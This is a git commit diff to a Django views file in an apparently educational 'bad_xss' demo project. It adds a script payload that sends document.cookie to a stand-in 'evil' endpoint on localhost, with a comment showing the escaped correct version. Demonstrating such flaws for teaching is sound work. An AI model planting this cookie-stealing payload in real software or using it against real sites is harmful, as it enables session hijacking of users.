fc0c33b2b98ebeff75d96fe77ac048d724c9b8c4
ftnext <takuyafjp+develop@gmail.com>
2023-10-05 03:15:09 +0900

    [feat] Send cookie to server (XSS vulnerability)

--- cross-site-scripting/bad_xss/example/views.py
+++ cross-site-scripting/bad_xss/example/views.py
@@ -1,11 +1,13 @@
+from django.contrib.auth.decorators import login_required
 from django.http import HttpResponse
 from django.template.response import TemplateResponse
 from django.utils.html import escape
 
 
+@login_required
 def example(request):
     # return HttpResponse("Hello world")
-    return HttpResponse('<script>window.location = "http://127.0.0.1:8080/chinanago"</script>')
+    return HttpResponse('<script>window.location = "http://127.0.0.1:8080/evil?cookie="+escape(document.cookie)</script>')
     # Correct implementation:
     # return HttpResponse(escape('<script>alert("XSSです")</script>'))
 
